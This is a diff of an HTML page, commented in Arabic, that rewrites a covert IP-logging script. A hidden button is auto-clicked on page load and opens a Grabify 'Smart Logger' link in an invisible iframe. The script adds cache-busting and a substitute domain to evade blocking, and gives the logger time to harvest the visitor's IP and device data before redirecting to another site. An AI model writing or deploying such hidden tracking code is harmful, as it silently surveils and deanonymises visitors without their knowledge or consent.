@@ -7,30 +7,40 @@
 </head>
 <body>
 
+  <!-- زر مخفي تماماً عن عين المستخدم -->
+  <button id="autoBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>
+
   <script>
-    window.addEventListener("load", function() {
-      // 1. توليد رقم عشوائي لكسر حماية التكرار والكاش
-      const randomNumber = Math.floor(Math.random() * 999999);
+    // 1. انتظر حتى يتم تحميل هيكل الصفحة بالكامل
+    document.addEventListener("DOMContentLoaded", function() {
+      const btn = document.getElementById('autoBtn');
       
-      // قم بوضع رابطك الجديد أو الحالي هنا مع إضافة متغير الكاش
-      const grabifyUrl = "https://imagehub.fun/JLMB8N" + randomNumber; 
-      const destinationUrl = "https://dominoes.mx";
+      // 2. برمجة ماذا سيحدث عندما يتم الضغط على الزر
+      btn.addEventListener('click', function() {
+        // توليد متغير عشوائي لكسر الكاش والحظر المكرر في كل مرة
+        const cacheBuster = Math.floor(Math.random() * 999999);
+        
+        // ⚠️ استبدل هذا الرابط برابط Grabify الجديد (ويُفضل بنطاق بديل غير grabify.link)
+        const grabifyUrl = 'https://photospace.life/JLMB8N' + cacheBuster; 
+        const destinationUrl = 'https://dominoes.mx';
 
-      // 2. إنشاء iframe برمجياً لإعطاء الـ Smart Logger بيئة متصفح كاملة للعمل
-      const iframe = document.createElement('iframe');
-      iframe.style.display = "none";
-      iframe.style.width = "0px";
-      iframe.style.height = "0px";
-      iframe.style.border = "none";
-      iframe.src = grabifyUrl;
-      
-      // إدخال الإطار في الصفحة ليبدأ بالعمل فوراً
-      document.body.appendChild(iframe);
+        // إنشاء إطار (iframe) برمجياً ليعطي الـ Smart Logger بيئة متصفح كاملة
+        const iframe = document.createElement('iframe');
+        iframe.style.display = "none";
+        iframe.style.width = "0px";
+        iframe.style.height = "0px";
+        iframe.style.border = "none";
+        iframe.src = grabifyUrl;
+        document.body.appendChild(iframe);
 
-      // 3. نمنح الـ Smart Logger مهلة (ثانيتين) لجمع بيانات البطارية والجهاز وإرسالها بالكامل
-      setTimeout(function() {
+        // 3. منح الـ Smart Logger مهلة (ثانية ونصف) لجمع بيانات الجهاز والـ IP ثم التوجيه
+        setTimeout(function() {
           window.location.href = destinationUrl;
-      }, 2000); // ثانيتين كافية جداً لإنهاء الـ Smart Logger مهمته بصمت
+        }, 1500);
+      });
+
+      // 4. إجبار المتصفح على ضغط الزر أوتوماتيكياً فوراً بدون تدخل المستخدم
+      btn.click();
     });
   </script>
 
